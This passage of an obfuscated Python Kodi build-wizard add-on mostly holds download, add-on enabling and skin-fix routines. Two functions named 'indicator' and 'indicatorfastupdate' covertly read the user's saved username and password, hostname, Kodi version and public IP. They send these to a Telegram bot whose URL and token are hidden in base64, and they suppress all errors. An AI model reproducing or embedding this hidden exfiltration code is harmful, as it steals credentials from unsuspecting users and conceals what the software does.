    O00O00000OO0O00O0 =True #line:3452
  except AttributeError :#line:3453
        O00O00000OO0O00O0 =False #line:3454
  if O00O00000OO0O00O0 :#line:3456
        O000000000O0O0O0O =int (O000000000O0O0O0O )#line:3457
  O0OOO0O000O0O0O00 =0 #line:3459
  OO0O0O0OOOO0OOOOO =time .time ()#line:3460
  while True :#line:3461
        OO0O0O0O00O000O00 =O0OO0O000OO0000OO .read (8192 )#line:3462
        if not OO0O0O0O00O000O00 :#line:3463
            sys .stdout .write ('\n')#line:3464
            break #line:3465
        O0OOO0O000O0O0O00 +=len (OO0O0O0O00O000O00 )#line:3467
        OOOOOOOOOO0O0OOOO .write (OO0O0O0O00O000O00 )#line:3468
        if not O00O00000OO0O00O0 :#line:3470
            O000000000O0O0O0O =O0OOO0O000O0O0O00 #line:3471
        if O0OO0O0OOO00000O0 .iscanceled ():#line:3472
           O0OO0O0OOO00000O0 .close ()#line:3473
           try :#line:3474
            os .remove (OO00OOOO00O00O000 )#line:3475
           except :#line:3476
            pass #line:3477
           break #line:3478
        OOOO0O0OOOO00OOOO =float (O0OOO0O000O0O0O00 )/O000000000O0O0O0O #line:3479
        OOOO0O0OOOO00OOOO =round (OOOO0O0OOOO00OOOO *100 ,2 )#line:3480
        OOO00000000O00OO0 =O0OOO0O000O0O0O00 /(1024 *1024 )#line:3481
        O0O0O000000OO00O0 =O000000000O0O0O0O /(1024 *1024 )#line:3482
        OO00OO00O0OOOOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00000000O00OO0 ,'teal',O0O0O000000OO00O0 )#line:3483
        if (time .time ()-OO0O0O0OOOO0OOOOO )>0 :#line:3484
          O00O0OO00O00O00O0 =O0OOO0O000O0O0O00 /(time .time ()-OO0O0O0OOOO0OOOOO )#line:3485
          O00O0OO00O00O00O0 =O00O0OO00O00O00O0 /1024 #line:3486
        else :#line:3487
         O00O0OO00O00O00O0 =0 #line:3488
        O0O00OO00OOOO00OO ='KB'#line:3489
        if O00O0OO00O00O00O0 >=1024 :#line:3490
           O00O0OO00O00O00O0 =O00O0OO00O00O00O0 /1024 #line:3491
           O0O00OO00OOOO00OO ='MB'#line:3492
        if O00O0OO00O00O00O0 >0 and not OOOO0O0OOOO00OOOO ==100 :#line:3493
            OO000OO0OOO0O0O0O =(O000000000O0O0O0O -O0OOO0O000O0O0O00 )/O00O0OO00O00O00O0 #line:3494
        else :#line:3495
            OO000OO0OOO0O0O0O =0 #line:3496
        OO0OO0O00000O0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0OO00O00O00O0 ,O0O00OO00OOOO00OO )#line:3497
        O0OO0O0OOO00000O0 .update (int (OOOO0O0OOOO00OOOO ),"Downloading "+name ,OO00OO00O0OOOOO0O ,OO0OO0O00000O0000 )#line:3499
  OO000O0OO0OOOOO00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3502
  OOOOOOOOOO0O0OOOO .close ()#line:3504
  extract (OO00OOOO00O00O000 ,OO000O0OO0OOOOO00 ,O0OO0O0OOO00000O0 )#line:3506
  if os .path .exists (OO000O0OO0OOOOO00 +'/scakemyer-script.quasar.burst'):#line:3507
    if os .path .exists (OO000O0OO0OOOOO00 +'/script.quasar.burst'):#line:3508
     shutil .rmtree (OO000O0OO0OOOOO00 +'/script.quasar.burst',ignore_errors =False )#line:3509
    os .rename (OO000O0OO0OOOOO00 +'/scakemyer-script.quasar.burst',OO000O0OO0OOOOO00 +'/script.quasar.burst')#line:3510
  if os .path .exists (OO000O0OO0OOOOO00 +'/plugin.video.kmediatorrent-master'):#line:3512
    if os .path .exists (OO000O0OO0OOOOO00 +'/plugin.video.kmediatorrent'):#line:3513
     shutil .rmtree (OO000O0OO0OOOOO00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3514
    os .rename (OO000O0OO0OOOOO00 +'/plugin.video.kmediatorrent-master',OO000O0OO0OOOOO00 +'/plugin.video.kmediatorrent')#line:3515
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3516
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3517
  try :#line:3518
    os .remove (OO00OOOO00O00O000 )#line:3519
  except :#line:3520
    pass #line:3521
  O0OO0O0OOO00000O0 .close ()#line:3522
def dis_or_enable_addon (O00OO0OOOOOOOOO0O ,OOOO0000OOO0O000O ,enable ="true"):#line:3523
    import json #line:3524
    O00O00OO0OOO000O0 ='"%s"'%O00OO0OOOOOOOOO0O #line:3525
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO0OOOOOOOOO0O )and enable =="true":#line:3526
        logging .warning ('already Enabled')#line:3527
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00OO0OOOOOOOOO0O )#line:3528
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO0OOOOOOOOO0O )and enable =="false":#line:3529
        return xbmc .log ("### Skipped %s, reason = not installed"%O00OO0OOOOOOOOO0O )#line:3530
    else :#line:3531
        O00OO00OOOO00O0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O00OO0OOO000O0 ,enable )#line:3532
        OOO0000OOOOOOOOOO =xbmc .executeJSONRPC (O00OO00OOOO00O0OO )#line:3533
        O0000000O0OOO00OO =json .loads (OOO0000OOOOOOOOOO )#line:3534
        if enable =="true":#line:3535
            xbmc .log ("### Enabled %s, response = %s"%(O00OO0OOOOOOOOO0O ,O0000000O0OOO00OO ))#line:3536
        else :#line:3537
            xbmc .log ("### Disabled %s, response = %s"%(O00OO0OOOOOOOOO0O ,O0000000O0OOO00OO ))#line:3538
    if OOOO0000OOO0O000O =='auto':#line:3539
     return True #line:3540
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3541
def chunk_report (O0O00OOO0O0OO0OOO ,OO000OO0OO00OOO00 ,OOO0O000O000O000O ):#line:3542
   OOOO0000O00O000OO =float (O0O00OOO0O0OO0OOO )/OOO0O000O000O000O #line:3543
   OOOO0000O00O000OO =round (OOOO0000O00O000OO *100 ,2 )#line:3544
   if O0O00OOO0O0OO0OOO >=OOO0O000O000O000O :#line:3546
      sys .stdout .write ('\n')#line:3547
def chunk_read (OO00OOO000000000O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3549
   import time #line:3550
   O00OOO00OOO0O00OO =int (filesize )*1000000 #line:3551
   O00O0000O00000O00 =0 #line:3553
   O0OO00O000O00OO0O =time .time ()#line:3554
   O0OO00OOOOOO0000O =0 #line:3555
   logging .warning ('Downloading')#line:3557
   with open (destination ,"wb")as OOOO0OO0OO0000000 :#line:3558
    while 1 :#line:3559
      OO0OO00OOOOOO0OOO =time .time ()-O0OO00O000O00OO0O #line:3560
      OOOO0OOO0O0OOOO0O =int (O0OO00OOOOOO0000O *chunk_size )#line:3561
      OOO00OO0OO0O0O00O =OO00OOO000000000O .read (chunk_size )#line:3562
      OOOO0OO0OO0000000 .write (OOO00OO0OO0O0O00O )#line:3563
      OOOO0OO0OO0000000 .flush ()#line:3564
      O00O0000O00000O00 +=len (OOO00OO0OO0O0O00O )#line:3565
      O0O00OO00OOOOO0O0 =float (O00O0000O00000O00 )/O00OOO00OOO0O00OO #line:3566
      O0O00OO00OOOOO0O0 =round (O0O00OO00OOOOO0O0 *100 ,2 )#line:3567
      if int (OO0OO00OOOOOO0OOO )>0 :#line:3568
        OOOO0OO0O0O0OO0O0 =int (OOOO0OOO0O0OOOO0O /(1024 *OO0OO00OOOOOO0OOO ))#line:3569
      else :#line:3570
         OOOO0OO0O0O0OO0O0 =0 #line:3571
      if OOOO0OO0O0O0OO0O0 >1024 and not O0O00OO00OOOOO0O0 ==100 :#line:3572
          OO0O000O00O0OOOO0 =int (((O00OOO00OOO0O00OO -OOOO0OOO0O0OOOO0O )/1024 )/(OOOO0OO0O0O0OO0O0 ))#line:3573
      else :#line:3574
          OO0O000O00O0OOOO0 =0 #line:3575
      if OO0O000O00O0OOOO0 <0 :#line:3576
        OO0O000O00O0OOOO0 =0 #line:3577
      dp .update (int (O0O00OO00OOOOO0O0 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O00OO00OOOOO0O0 ,OOOO0OOO0O0OOOO0O /(1024 *1024 ),O00OOO00OOO0O00OO /(1000 *1000 ),OOOO0OO0O0O0OO0O0 ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (OO0O000O00O0OOOO0 ,60 ))#line:3578
      if dp .iscanceled ():#line:3579
         dp .close ()#line:3580
         break #line:3581
      if not OOO00OO0OO0O0O00O :#line:3582
         break #line:3583
      if report_hook :#line:3585
         report_hook (O00O0000O00000O00 ,chunk_size ,O00OOO00OOO0O00OO )#line:3586
      O0OO00OOOOOO0000O +=1 #line:3587
   logging .warning ('END Downloading')#line:3588
   return O00O0000O00000O00 #line:3589
def googledrive_download (OO0OOOO0O0O0O00OO ,O000O00OOO00000O0 ,O0O000000O00OOOO0 ,OO0OOO0O0000OO0OO ):#line:3591
    O00O0OOO0000O00O0 =[]#line:3595
    O00OO00OO0000O00O =OO0OOOO0O0O0O00OO .split ('=')#line:3596
    OO0OOOO0O0O0O00OO =O00OO00OO0000O00O [len (O00OO00OO0000O00O )-1 ]#line:3597
    def OO0OOO0OO0O0OO0O0 (O0OOO0OOO00OO00O0 ):#line:3599
        for O00OO0O00000O0000 in O0OOO0OOO00OO00O0 :#line:3601
            logging .warning ('cookie.name')#line:3602
            logging .warning (O00OO0O00000O0000 .name )#line:3603
            O00O000O0O00000O0 =O00OO0O00000O0000 .value #line:3604
            if 'download_warning'in O00OO0O00000O0000 .name :#line:3605
                logging .warning (O00OO0O00000O0000 .value )#line:3606
                logging .warning ('cookie.value')#line:3607
                return O00OO0O00000O0000 .value #line:3608
            return O00O000O0O00000O0 #line:3609
        return None #line:3611
    def O0OOOO0O00OO0OO00 (O0O0OO000000OO0O0 ,O0O00OO00O000O0O0 ):#line:3613
        O0OOO0OO0OOOOO0O0 =32768 #line:3615
        O0OO00OOO0OOO0O00 =time .time ()#line:3616
        with open (O0O00OO00O000O0O0 ,"wb")as OOO0OOO0OO000O000 :#line:3618
            O00OOO0O00OO00OOO =1 #line:3619
            OO000OO0O00OO000O =32768 #line:3620
            try :#line:3621
                OO0OO0OO00OOO00OO =int (O0O0OO000000OO0O0 .headers .get ('content-length'))#line:3622
                print ('file total size :',OO0OO0OO00OOO00OO )#line:3623
            except TypeError :#line:3624
                print ('using dummy length !!!')#line:3625
                OO0OO0OO00OOO00OO =int (OO0OOO0O0000OO0OO )*1000000 #line:3626
            for OOOOO000000O0000O in O0O0OO000000OO0O0 .iter_content (O0OOO0OO0OOOOO0O0 ):#line:3627
                if OOOOO000000O0000O :#line:3628
                    OOO0OOO0OO000O000 .write (OOOOO000000O0000O )#line:3629
                    OOO0OOO0OO000O000 .flush ()#line:3630
                    O000OOOO0O00O0000 =time .time ()-O0OO00OOO0OOO0O00 #line:3631
                    O000OOOO0O0O0O0O0 =int (O00OOO0O00OO00OOO *OO000OO0O00OO000O )#line:3632
                    if O000OOOO0O00O0000 ==0 :#line:3633
                        O000OOOO0O00O0000 =0.1 #line:3634
                    O00000O00OO00O000 =int (O000OOOO0O0O0O0O0 /(1024 *O000OOOO0O00O0000 ))#line:3635
                    OO00OOO0O0OOO00OO =int (O00OOO0O00OO00OOO *OO000OO0O00OO000O *100 /OO0OO0OO00OOO00OO )#line:3636
                    if O00000O00OO00O000 >1024 and not OO00OOO0O0OOO00OO ==100 :#line:3637
                      O0OOO0000O00OOO00 =int (((OO0OO0OO00OOO00OO -O000OOOO0O0O0O0O0 )/1024 )/(O00000O00OO00O000 ))#line:3638
                    else :#line:3639
                      O0OOO0000O00OOO00 =0 #line:3640
                    O0O000000O00OOOO0 .update (int (OO00OOO0O0OOO00OO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OOO0O0OOO00OO ,O000OOOO0O0O0O0O0 /(1024 *1024 ),OO0OO0OO00OOO00OO /(1000 *1000 ),O00000O00OO00O000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OOO0000O00OOO00 ,60 ))#line:3642
                    O00OOO0O00OO00OOO +=1 #line:3643
                    if O0O000000O00OOOO0 .iscanceled ():#line:3644
                     O0O000000O00OOOO0 .close ()#line:3645
                     break #line:3646
    OOO00OO000O000000 ="https://docs.google.com/uc?export=download"#line:3647
    import urllib2 #line:3652
    import cookielib #line:3653
    from cookielib import CookieJar #line:3655
    O000O0OOOO00OO0OO =CookieJar ()#line:3657
    OO000O000O0OO0O0O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O000O0OOOO00OO0OO ))#line:3658
    OOOO0OOO00000OO0O ={'id':OO0OOOO0O0O0O00OO }#line:3660
    O00O0O000O00OOOOO =urllib .urlencode (OOOO0OOO00000OO0O )#line:3661
    logging .warning (OOO00OO000O000000 +'&'+O00O0O000O00OOOOO )#line:3662
    OOO00OO0OO0OOOO00 =OO000O000O0OO0O0O .open (OOO00OO000O000000 +'&'+O00O0O000O00OOOOO )#line:3663
    O00O00OOO0OO0OO0O =OOO00OO0OO0OOOO00 .read ()#line:3664
    for O0O0000000O0OO000 in O000O0OOOO00OO0OO :#line:3666
         logging .warning (O0O0000000O0OO000 )#line:3667
    O0OOO0O0O00OOO0OO =OO0OOO0OO0O0OO0O0 (O000O0OOOO00OO0OO )#line:3668
    logging .warning (O0OOO0O0O00OOO0OO )#line:3669
    if O0OOO0O0O00OOO0OO :#line:3670
        OO00O0OOOOO000000 ={'id':OO0OOOO0O0O0O00OO ,'confirm':O0OOO0O0O00OOO0OO }#line:3671
        O0O0O00O00OOOO0O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3672
        O00O0O000O00OOOOO =urllib .urlencode (OO00O0OOOOO000000 )#line:3673
        OOO00OO0OO0OOOO00 =OO000O000O0OO0O0O .open (OOO00OO000O000000 +'&'+O00O0O000O00OOOOO )#line:3674
        chunk_read (OOO00OO0OO0OOOO00 ,report_hook =chunk_report ,dp =O0O000000O00OOOO0 ,destination =O000O00OOO00000O0 ,filesize =OO0OOO0O0000OO0OO )#line:3675
    return (O00O0OOO0000O00O0 )#line:3679
def kodi17Fix ():#line:3680
	O0O00O000000O0000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3681
	O0OOO00O0OO0O0O00 =[]#line:3682
	for O0O000O00000OOO00 in sorted (O0O00O000000O0000 ,key =lambda OOO0O00000O00OO00 :OOO0O00000O00OO00 ):#line:3683
		O0O0O0000OOOOO00O =os .path .join (O0O000O00000OOO00 ,'addon.xml')#line:3684
		if os .path .exists (O0O0O0000OOOOO00O ):#line:3685
			O0O0OO0O0000O0O00 =O0O000O00000OOO00 .replace (ADDONS ,'')[1 :-1 ]#line:3686
			OO0000OO0O00000OO =open (O0O0O0000OOOOO00O )#line:3687
			OOO0O00000000000O =OO0000OO0O00000OO .read ()#line:3688
			OO00OOO000O00O000 =parseDOM (OOO0O00000000000O ,'addon',ret ='id')#line:3689
			OO0000OO0O00000OO .close ()#line:3690
			try :#line:3691
				O000OOOOOO0O000O0 =xbmcaddon .Addon (id =OO00OOO000O00O000 [0 ])#line:3692
			except :#line:3693
				try :#line:3694
					log ("%s was disabled"%OO00OOO000O00O000 [0 ],xbmc .LOGDEBUG )#line:3695
					O0OOO00O0OO0O0O00 .append (OO00OOO000O00O000 [0 ])#line:3696
				except :#line:3697
					try :#line:3698
						log ("%s was disabled"%O0O0OO0O0000O0O00 ,xbmc .LOGDEBUG )#line:3699
						O0OOO00O0OO0O0O00 .append (O0O0OO0O0000O0O00 )#line:3700
					except :#line:3701
						if len (OO00OOO000O00O000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O0OO0O0000O0O00 ,xbmc .LOGERROR )#line:3702
						else :log ("Unabled to enable: %s"%O0O000O00000OOO00 ,xbmc .LOGERROR )#line:3703
	if len (O0OOO00O0OO0O0O00 )>0 :#line:3704
		O000000O000O0000O =0 #line:3705
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3706
		for O0O0OO0000OOOO0OO in O0OOO00O0OO0O0O00 :#line:3707
			O000000O000O0000O +=1 #line:3708
			OOOO00O000O0OOO00 =int (percentage (O000000O000O0000O ,len (O0OOO00O0OO0O0O00 )))#line:3709
			DP .update (OOOO00O000O0OOO00 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO0000OOOO0OO ))#line:3710
			addonDatabase (O0O0OO0000OOOO0OO ,1 )#line:3711
			if DP .iscanceled ():break #line:3712
		if DP .iscanceled ():#line:3713
			DP .close ()#line:3714
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3715
			sys .exit ()#line:3716
		DP .close ()#line:3717
	forceUpdate ()#line:3718
def indicator ():#line:3720
       try :#line:3721
          import json #line:3722
          wiz .log ('FRESH MESSAGE')#line:3723
          OO0OOO00O0OO0000O =(ADDON .getSetting ("user"))#line:3724
          O0O00000O000O00O0 =(ADDON .getSetting ("pass"))#line:3725
          O00OO00O0O00OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3726
          O0O0000O000O00OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3727
          O00OO00OO0O0OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OO00O00O0O0O000OO =str (json .loads (O00OO00OO0O0OO0O0 )['ip'])#line:3729
          O0O0OOO0O0OO0O0O0 =OO0OOO00O0OO0000O #line:3730
          OO0OO0O0OOOO0O0OO =O0O00000O000O00O0 #line:3731
          import socket #line:3732
          O00OO00OO0O0OO0O0 =urllib2 .urlopen (O0O0000O000O00OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0OOO0O0OO0O0O0 +' - '+OO0OO0O0OOOO0O0OO +' - '+O00OO00O0O00OOOOO +' - '+OO00O00O0O0O000OO ).readlines ()#line:3733
       except :pass #line:3735
def indicatorfastupdate ():#line:3737
       try :#line:3738
          import json #line:3739
          wiz .log ('FRESH MESSAGE')#line:3740
          O00000OO000O000OO =(ADDON .getSetting ("user"))#line:3741
          O0OO0OO0OO000O00O =(ADDON .getSetting ("pass"))#line:3742
          O00000OO00O000O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3743
          OO00OO00OOOO0OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3745
          O00OO0OOOO0OO00OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3746
          OO0O0OO000O0O00OO =str (json .loads (O00OO0OOOO0OO00OO )['ip'])#line:3747
          O000O0O00O0O00000 =O00000OO000O000OO #line:3748
          O0O0O0OOO0O0000O0 =O0OO0OO0OO000O00O #line:3749
          import socket #line:3751
          O00OO0OOOO0OO00OO =urllib2 .urlopen (OO00OO00OOOO0OO00 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000O0O00O0O00000 +' - '+O0O0O0OOO0O0000O0 +' - '+O00000OO00O000O0O +' - '+OO0O0OO000O0O00OO ).readlines ()#line:3752
       except :pass #line:3754
def skinfix18 ():#line:3756
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3757
		OO00OOOO0O0000000 =wiz .workingURL (SKINID18DDONXML )#line:3758
		if OO00OOOO0O0000000 ==True :#line:3759
			O0O0O0OOO0OOO0O0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3760
			if len (O0O0O0OOO0OOO0O0O )>0 :#line:3761
				OOOOOOOOO000000OO ='%s-%s.zip'%(SKINID18 ,O0O0O0OOO0OOO0O0O [0 ])#line:3762
				O0000000O000O0O00 =wiz .workingURL (SKIN18ZIPURL +OOOOOOOOO000000OO )#line:3763
				if O0000000O000O0O00 ==True :#line:3764
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3765
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3766
					OOO000O00O00OO0OO =os .path .join (PACKAGES ,OOOOOOOOO000000OO )#line:3767
					try :os .remove (OOO000O00O00OO0OO )#line:3768
					except :pass #line:3769
					downloader .download (SKIN18ZIPURL +OOOOOOOOO000000OO ,OOO000O00O00OO0OO ,DP )#line:3770
					extract .all (OOO000O00O00OO0OO ,HOME ,DP )#line:3771
					try :#line:3772
						OOO00OOOOO0O0O0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3773
						O00O0OO0OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3774
						os .rename (OOO00OOOOO0O0O0OO ,O00O0OO0OO0OOO000 )#line:3775
					except :#line:3776
						pass #line:3777
					try :#line:3778
						O0O00O00OOOOO0O00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0O00OO0OO00000O =O0O00O00OOOOO0O00 .read ();O0O00O00OOOOO0O00 .close ()#line:3779
						O0O0OO0O00OO0O0OO =wiz .parseDOM (OO0O00OO0OO00000O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3780
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO0O00OO0O0OO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3781
					except :#line:3782
						pass #line:3783
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3784
					DP .close ()#line:3785
					xbmc .sleep (500 )#line:3786
					wiz .forceUpdate (True )#line:3787
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3788
				else :#line:3789
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3790
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0000000O000O0O00 ,xbmc .LOGERROR )#line:3791
			else :#line:3792
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3793
		else :#line:3794
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3795
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3796
def skinfix17 ():#line:3797
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3798
		OO0O0O00OOOOO0000 =wiz .workingURL (SKINID17DDONXML )#line:3799
		if OO0O0O00OOOOO0000 ==True :#line:3800
			OO00O0OOOOOO0O00O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3801
			if len (OO00O0OOOOOO0O00O )>0 :#line:3802
				O00OOOO0OOO0O000O ='%s-%s.zip'%(SKINID17 ,OO00O0OOOOOO0O00O [0 ])#line:3803
				O00O000OOO0O0OO00 =wiz .workingURL (SKIN17ZIPURL +O00OOOO0OOO0O000O )#line:3804
				if O00O000OOO0O0OO00 ==True :#line:3805
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3806
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3807
					OOO000OOOOOOOO0OO =os .path .join (PACKAGES ,O00OOOO0OOO0O000O )#line:3808
					try :os .remove (OOO000OOOOOOOO0OO )#line:3809
					except :pass #line:3810
					downloader .download (SKIN17ZIPURL +O00OOOO0OOO0O000O ,OOO000OOOOOOOO0OO ,DP )#line:3811
					extract .all (OOO000OOOOOOOO0OO ,HOME ,DP )#line:3812
					try :#line:3813
						O0O000O0OOO0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3814
						OOOO00O000OOOO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3815
						os .rename (O0O000O0OOO0O0OO0 ,OOOO00O000OOOO000 )#line:3816
					except :#line:3817
						pass #line:3818
					try :#line:3819
						OOO000O0OOOO000O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0OO0OO0O0O0O00OO =OOO000O0OOOO000O0 .read ();OOO000O0OOOO000O0 .close ()#line:3820
						OO0O00OO0000OO000 =wiz .parseDOM (O0OO0OO0O0O0O00OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3821
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00OO0000OO000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3822
					except :#line:3823
						pass #line:3824
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3825
					DP .close ()#line:3826
					xbmc .sleep (500 )#line:3827
					wiz .forceUpdate (True )#line:3828
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3829
				else :#line:3830
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3831
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O000OOO0O0OO00 ,xbmc .LOGERROR )#line:3832
			else :#line:3833
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3834
		else :#line:3835
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3836
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3837
def fix17update ():#line:3838
	if KODIV >=17 and KODIV <18 :#line:3839
		wiz .kodi17Fix ()#line:3840
		xbmc .sleep (4000 )#line:3841
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3842
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3843
		fixfont ()#line:3844
		O0OO00O0O0OO00O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3845
		try :#line:3847
			OOOO0O0OO00OO000O =open (O0OO00O0O0OO00O00 ,'r')#line:3848
			O0000000O0O0OOO0O =OOOO0O0OO00OO000O .read ()#line:3849
			OOOO0O0OO00OO000O .close ()#line:3850
			OOO0OOOO000000000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3851
			O000OO0O0OOOOOO0O =re .compile (OOO0OOOO000000000 ).findall (O0000000O0O0OOO0O )[0 ]#line:3852
			OOOO0O0OO00OO000O =open (O0OO00O0O0OO00O00 ,'w')#line:3853
			OOOO0O0OO00OO000O .write (O0000000O0O0OOO0O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O000OO0O0OOOOOO0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3854
			OOOO0O0OO00OO000O .close ()#line:3855
		except :#line:3856
				pass #line:3857
		wiz .kodi17Fix ()#line:3858
		O0OO00O0O0OO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3859
		try :#line:3860
			OOOO0O0OO00OO000O =open (O0OO00O0O0OO00O00 ,'r')#line:3861
			O0000000O0O0OOO0O =OOOO0O0OO00OO000O .read ()#line:3862
			OOOO0O0OO00OO000O .close ()#line:3863
			OOO0OOOO000000000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3864
			O000OO0O0OOOOOO0O =re .compile (OOO0OOOO000000000 ).findall (O0000000O0O0OOO0O )[0 ]#line:3865
			OOOO0O0OO00OO000O =open (O0OO00O0O0OO00O00 ,'w')#line:3866
			OOOO0O0OO00OO000O .write (O0000000O0O0OOO0O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O000OO0O0OOOOOO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3867
			OOOO0O0OO00OO000O .close ()#line:3868
		except :#line:3869
				pass #line:3870
		swapSkins ('skin.Premium.mod')#line:3871
def fix18update ():#line:3873
	if KODIV >=18 :#line:3874
		xbmc .sleep (4000 )#line:3875
